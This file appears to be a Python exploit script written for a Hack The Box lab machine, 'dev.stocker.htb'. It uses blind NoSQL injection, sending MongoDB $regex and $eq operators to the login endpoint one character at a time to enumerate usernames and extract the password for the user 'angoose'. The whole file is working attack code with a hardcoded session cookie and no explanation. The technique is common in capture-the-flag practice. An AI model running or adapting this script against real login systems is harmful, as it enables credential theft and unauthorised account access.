import requests
import string
import json

PROXY = {"http": "http://127.0.0.1:8080"}
url = "http://dev.stocker.htb/login"
headers = {"Host": "dev.stocker.htb", "Content-Type": "application/json"}
cookies = {"connect.sid": "s%3AUem8KmKgZYBvEVaROXZr6WEBuLqetKag.DwS3d7ypPzhqTXw4k3sg8maLe6GiCgDmmmo960%2BpxCY"}
possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
def get_password(username):
    print("Extracting password of "+username)
    params = {"username": {"$eq": username}, "password": {"$regex": "" }}
    password = "^"
    while True:
        for c in possible_chars:
            params["password"]["$regex"] = password + c + ".*"
            pr = requests.post(url, data=json.dumps(params), headers=headers, cookies=cookies, verify=False, allow_redirects=False, proxies=PROXY)
            if int(pr.status_code) == 302 and "/stock" in pr.text:
                password += c
                break
        if c == possible_chars[-1]:
            print("Found password "+password[1:].replace("\\", "")+" for username "+username)
            return password[1:].replace("\\", "")

def get_usernames():
    usernames = []
    params = {"username": {"$regex": ""}, "password": {"$regex": ".*" }}
    for c in possible_chars:
        username = "^" + c
        params["username"]["$regex"] = username + ".*"
        pr = requests.post(url, data=json.dumps(params), headers=headers, cookies=cookies, verify=False, allow_redirects=False)
        if int(pr.status_code) == 302 and "/stock" in pr.text:
            print("Found username starting with "+c)
            while True:
                for c2 in possible_chars:
                    params["username"]["$regex"] = username + c2 + ".*"
                    pr2 = requests.post(url, data=json.dumps(params), headers=headers, cookies=cookies, verify=False, allow_redirects=False)
                    if int(pr2.status_code) == 302 and "/stock" in pr2.text:
                        username += c2
                        print(username)
                        break

                if c2 == possible_chars[-1]:
                    print("Found username: "+username[1:])
                    usernames.append(username[1:])
                    break
    return usernames


# for u in get_usernames():
get_password("angoose")
